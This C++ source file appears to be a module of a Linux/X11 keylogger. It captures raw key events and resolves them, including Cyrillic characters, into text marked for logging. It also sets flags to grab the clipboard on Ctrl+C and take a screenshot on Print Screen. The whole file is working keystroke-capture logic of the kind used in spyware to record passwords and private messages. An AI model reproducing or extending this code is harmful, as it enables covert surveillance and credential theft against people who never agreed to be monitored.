#include "keyPressHelper.hpp"
#include "../cyrillicHelper/cyrillicHelper.hpp"
#include "../specialKeysHelper/specialKeysHelper.hpp" 
#include <cstring> 

KeyPressResult processKeyPress(Display* display, XIRawEvent* rawev, bool& ctrlPressed) {
    KeyPressResult result;
    XkbStateRec state;
    XkbGetState(display, XkbUseCoreKbd, &state);

    bool is_shift_pressed = (state.mods & ShiftMask);
    bool is_caps_lock_on  = (state.mods & LockMask);
    int level = is_shift_pressed ^ is_caps_lock_on;

    KeySym keysym = XkbKeycodeToKeysym(display, rawev->detail, state.group, level);

    if (keysym == NoSymbol) {
        keysym = XkbKeycodeToKeysym(display, rawev->detail, 0, level);
    }
    
    if (keysym == NoSymbol) {
        return result; 
    }

    if ((keysym == XK_c || keysym == XK_C || keysym == XK_Cyrillic_es || keysym == XK_Cyrillic_ES) && ctrlPressed) {
        result.should_grabBuffer = true;   
        ctrlPressed = false;
        return result;
    }

    switch (keysym) {
        case XK_Control_L:
            ctrlPressed = true;
            result.char_to_log = XKeysymToString(keysym);
            result.printable_name = result.char_to_log.c_str(); 
            return result; 

        case XK_Print:
            result.should_grabScreen = true;
            return result;

        case XK_Escape:
            result.should_exit = true;
            result.printable_name = "Escape";
            return result;
        
        default:
        {
            ctrlPressed = false;

            std::string special_char = handleSpecialKeys(keysym);
            if (!special_char.empty()) {
                result.char_to_log = special_char;
                result.printable_name = result.char_to_log.c_str(); 
            } else {
                const char* cyrillic_char = keysymToUtf8Cyrillic(keysym);
                if (cyrillic_char) {
                    result.char_to_log = cyrillic_char;
                    result.printable_name = cyrillic_char;
                } else {
                    const char* key_name = XKeysymToString(keysym);
                    if (key_name) {
                        result.printable_name = key_name;
                        if (strlen(key_name) == 1) {
                            result.char_to_log = key_name;
                        }
                    }
                }
            }
            break; 
        }
    }

return result;
}